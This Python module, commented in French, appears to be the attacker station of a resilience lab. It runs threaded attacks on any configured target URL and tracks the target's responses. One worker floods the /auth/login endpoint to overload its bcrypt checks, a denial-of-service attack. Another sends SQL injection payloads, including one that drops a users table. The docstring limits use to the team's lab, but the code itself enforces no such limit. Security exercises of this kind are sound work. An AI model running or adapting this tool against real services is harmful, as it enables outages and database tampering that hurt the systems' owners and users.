"""Moteur d'attaque — Resilience-Alpha (poste Attaquant).

Lance des attaques contrôlées contre la plateforme CIBLE et suit des indicateurs
côté attaquant (requêtes envoyées, erreurs reçues, temps de réponse de la cible).
Strictement limité au labo de l'équipe et à la cible configurée.
"""
import threading
import time
import random
import statistics
from collections import deque, Counter

import requests

SQLI_PAYLOADS = [
    "admin' OR '1'='1",
    "' OR 1=1--",
    "'; DROP TABLE users;--",
    "alice'--",
    "' UNION SELECT NULL,NULL--",
    "\" OR \"\"=\"",
]


class AttackController:
    def __init__(self, target_url: str):
        self.target_url = target_url.rstrip("/")
        self.lock = threading.Lock()
        self.running = False
        self.attack_type = None
        self.started_at = None
        self.duration = 0
        self.intensity = 0
        self._stop = threading.Event()
        self.history = deque(maxlen=120)
        self._last_sent = 0
        self._last_t = time.time()
        self._reset()
        threading.Thread(target=self._sample_loop, daemon=True).start()

    def _reset(self):
        self.sent = 0
        self.errors = 0     # réponses 5xx ou connexions échouées = la cible flanche
        self.refused = 0    # réponses 4xx = bloqué / refusé
        self.ok = 0         # réponses 2xx/3xx
        self.latencies = deque(maxlen=300)
        self.status_codes = Counter()

    # ---- état ----
    def status(self):
        with self.lock:
            avg_lat = round(statistics.mean(self.latencies) * 1000, 1) if self.latencies else 0.0
            elapsed = round(time.time() - self.started_at, 1) if (self.started_at and self.running) else 0
            remaining = max(0, round(self.duration - elapsed, 1)) if self.running else 0
            return {
                "running": self.running,
                "type": self.attack_type,
                "target": self.target_url,
                "intensity": self.intensity,
                "duration": self.duration,
                "elapsed": elapsed,
                "remaining": remaining,
                "sent": self.sent,
                "ok": self.ok,
                "errors": self.errors,
                "refused": self.refused,
                "avg_latency_ms": avg_lat,
                "status_codes": dict(self.status_codes),
                "history": list(self.history),
            }

    def _sample_loop(self):
        while True:
            time.sleep(1.0)
            with self.lock:
                now = time.time()
                dt = now - self._last_t
                rate = (self.sent - self._last_sent) / dt if dt > 0 else 0
                self._last_sent = self.sent
                self._last_t = now
                lat = round(statistics.mean(self.latencies) * 1000, 1) if self.latencies else 0
                if self.running:
                    self.history.append({"t": int(now), "rate": round(rate, 1),
                                         "errors": self.errors, "latency": lat})

    # ---- contrôle ----
    def start(self, attack_type="dos", intensity=10, duration=60):
        if self.running:
            return False
        attack_type = "sqli" if attack_type == "sqli" else "dos"
        self._stop.clear()
        with self.lock:
            self._reset()
            self.running = True
            self.attack_type = attack_type
            self.intensity = max(1, min(100, int(intensity)))
            self.duration = max(5, min(600, int(duration)))
            self.started_at = time.time()
            self.history.clear()
            self._last_sent = 0
            self._last_t = time.time()
        worker = self._dos_worker if attack_type == "dos" else self._sqli_worker
        for _ in range(self.intensity):
            threading.Thread(target=worker, daemon=True).start()
        threading.Thread(target=self._auto_stop, daemon=True).start()
        return True

    def _auto_stop(self):
        end = self.started_at + self.duration
        while self.running and time.time() < end:
            time.sleep(0.2)
        self.stop()

    def stop(self):
        self._stop.set()
        with self.lock:
            self.running = False

    def _record(self, code, latency, error=False):
        with self.lock:
            self.sent += 1
            self.latencies.append(latency)
            if code is not None:
                self.status_codes[str(code)] += 1
                if code >= 500:
                    self.errors += 1
                elif code >= 400:
                    self.refused += 1
                else:
                    self.ok += 1
            if error:
                self.errors += 1

    # ---- attaques ----
    def _dos_worker(self):
        # Saturation : flood de /auth/login (vérif bcrypt coûteuse => CPU/latence montent).
        url = f"{self.target_url}/auth/login"
        s = requests.Session()
        while not self._stop.is_set():
            t0 = time.time()
            try:
                r = s.post(url, json={"username": "alice", "password": "x" + str(random.random())}, timeout=6)
                self._record(r.status_code, time.time() - t0)
            except Exception:
                self._record(None, time.time() - t0, error=True)
            time.sleep(0.005)

    def _sqli_worker(self):
        # Injection : payloads SQL dans /auth/login (observable dans les logs / WAF).
        url = f"{self.target_url}/auth/login"
        s = requests.Session()
        while not self._stop.is_set():
            payload = random.choice(SQLI_PAYLOADS)
            t0 = time.time()
            try:
                r = s.post(url, json={"username": payload, "password": payload}, timeout=6)
                self._record(r.status_code, time.time() - t0)
            except Exception:
                self._record(None, time.time() - t0, error=True)
            time.sleep(0.2)
